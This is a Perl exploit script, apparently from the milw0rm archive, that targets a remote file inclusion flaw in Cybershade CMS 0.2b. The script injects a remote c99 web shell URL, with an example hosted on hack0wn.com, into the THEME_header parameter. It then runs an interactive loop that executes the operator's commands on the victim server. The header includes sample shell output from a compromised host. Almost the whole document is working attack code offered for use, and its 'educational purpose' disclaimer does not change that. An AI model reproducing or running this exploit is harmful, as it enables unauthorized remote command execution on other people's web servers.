#!/usr/bin/perl
####################################################################
# Cybershade CMS 0.2b (index.php) RFI shell_cmd[c99] Exploit
# url: http://sourceforge.net/projects/cybershadecms/
#
# Author: JosS
# mail: sys-project[at]hotmail[dot]com
# site: http://www.hack0wn.com
# team: Spanish Hackers Team - [SHT]
#
# Hack0wn Security Project!!
#
# This was written for educational purpose. Use it at your own risk.
# Author will be not responsible for any damage.
#
####################################################################
#
# "need" register_globals = On
#
# RFI vuln!: [index.php]
#    line 6: include $THEME_header;
#    line 8: include $THEME_footer;
#
####################################################################
# OUTPUT:
#
# [shell]:~$ id
#   uid=99(nobody) gid=99(nobody) groups=99(nobody)
# [shell]:~$ uname -a
#   Linux xxxxx.xxxxx.com 2.6.18-92.1.13.el5PAE #1 SMP Wed Sep 24 20:07:49 EDT 2008 i686 i686 i386 GNU/Linux
# [shell]:~$ 0h my God ;D

use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;
use Getopt::Long;

sub clear{
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
}

&clear();

sub banner {
        &clear();
	print "[x] Cybershade CMS 0.2b (index.php) RFI shell_cmd[c99] Exploit\n";
	print "[x] Written By JosS\n";
	print "[x] sys-project[at]hotmail[dot]com\n\n";
	print "[+] Usage:\n";
	print "[+]     $0 -vuln \"web+path\" -shell \"shell\"\n";
	print "[+] eX: $0 -vuln \"http://www.p0c.com/cms/\" -shell \"http://hack0wn.com/desc/shells/c99.txt?\"\n\n";
        exit();
}

my $options = GetOptions (
  'help!'            => \$help, 
  'vuln=s'            => \$vuln, 
  'shell=s'            => \$shell
  );

&banner unless ($vuln);
&banner unless ($shell);

&banner if $banner eq 1;

chomp($vuln);
chomp($shell);

while (){

	print "[shell]:~\$ ";
	chomp($cmd=<STDIN>);

	if ($cmd eq "exit" || $cmd eq "quit") {
		exit 0;
	}

	my $ua = LWP::UserAgent->new;
        $iny="?&act=cmd&cmd=" . $cmd . "&d=/&submit=1&cmd_txt=1";
        chomp($iny);
        my $own = $vuln . "/index.php?THEME_header=" . $shell . $iny;
        chomp($own);
	my $req = HTTP::Request->new(GET => $own);
	my $res = $ua->request($req);
	my $con = $res->content;
	if ($res->is_success){
		print $1,"\n" if ( $con =~ m/readonly> (.*?)\<\/textarea>/mosix);
	}
           else
             {
                print "[p0c] Exploit failed\n";
                exit(1);
             }
}

# __h0__

# milw0rm.com [2009-01-05]
